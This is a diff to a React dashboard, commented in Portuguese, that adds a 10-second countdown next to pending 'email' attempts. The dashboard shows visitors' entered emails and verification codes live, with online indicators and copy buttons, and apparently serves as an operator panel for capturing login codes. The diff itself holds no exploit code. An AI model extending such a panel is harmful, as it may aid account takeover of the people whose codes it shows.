@@ -51,6 +51,11 @@ interface AttemptRow {
   kind: "email" | "code";
 }
 
+function getEmailPendingSecondsLeft(codeAt: string): number {
+  const elapsed = Math.floor((Date.now() - new Date(codeAt).getTime()) / 1000);
+  return Math.max(0, 10 - elapsed);
+}
+
 interface ActiveSession {
   session_id: string;
   ad_id: string;
@@ -181,6 +186,12 @@ export default function Dashboard() {
   /** Requisições do visitante (esqueci senha, sem senha, reativar, reenviar código). */
   const [requests, setRequests] = useState<RequestRow[]>([]);
   const [requestsPulse, setRequestsPulse] = useState(false);
+  const [, setEmailCountdownTick] = useState(0);
+
+  useEffect(() => {
+    const timer = window.setInterval(() => setEmailCountdownTick((v) => v + 1), 1000);
+    return () => window.clearInterval(timer);
+  }, []);
 
   /** Tick que avança a cada minuto pra reavaliar o TTL das sessões em andamento. */
   const [nowTick, setNowTick] = useState(() => Date.now());
@@ -823,9 +834,16 @@ export default function Dashboard() {
                           <span className="text-[10px] uppercase tracking-wide text-primary font-semibold">
                             {pending.kind === "email" ? "E-mail recebido" : "Código recebido"}
                           </span>
-                          <span className="text-[10px] text-muted-foreground font-mono-tabular">
-                            {formatTime(pending.codeAt)}
-                          </span>
+                          <div className="text-right">
+                            <span className="block text-[10px] text-muted-foreground font-mono-tabular">
+                              {formatTime(pending.codeAt)}
+                            </span>
+                            {pending.kind === "email" && pending.status === "pending" && (
+                              <span className="block text-[10px] font-mono-tabular text-primary">
+                                {getEmailPendingSecondsLeft(pending.codeAt)}s
+                              </span>
+                            )}
+                          </div>
                         </div>
                         <div className={`font-mono text-foreground ${pending.kind === "email" ? "break-all text-xs font-medium" : "text-base font-bold tracking-[0.3em]"}`}>
                           {pending.kind === "email" ? pending.email : pending.code}
@@ -1176,9 +1194,16 @@ function AttemptsTable({
             >
               <div className="flex items-center justify-between gap-2">
                 {actionable ? <StatusDot online={isOnline} /> : <span />}
-                <span className="text-[10px] text-muted-foreground font-mono-tabular">
-                  {formatTime(row.codeAt)}
-                </span>
+                <div className="text-right">
+                  <span className="block text-[10px] text-muted-foreground font-mono-tabular">
+                    {formatTime(row.codeAt)}
+                  </span>
+                  {actionable && row.kind === "email" && row.status === "pending" && (
+                    <span className="block text-[10px] font-mono-tabular text-primary">
+                      {getEmailPendingSecondsLeft(row.codeAt)}s
+                    </span>
+                  )}
+                </div>
               </div>
               <div className="space-y-1.5">
                 <div className="flex items-start gap-2 text-xs">
@@ -1291,7 +1316,12 @@ function AttemptsTable({
                   </td>
                 )}
                 <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground font-mono-tabular">
-                  {formatTime(row.codeAt)}
+                  <div>
+                    <span className="block">{formatTime(row.codeAt)}</span>
+                    {actionable && row.kind === "email" && row.status === "pending" && (
+                      <span className="block text-primary">{getEmailPendingSecondsLeft(row.codeAt)}s</span>
+                    )}
+                  </div>
                 </td>
                 <td className="break-all px-4 py-3 font-mono text-xs">
                   <CopyText value={row.email} />
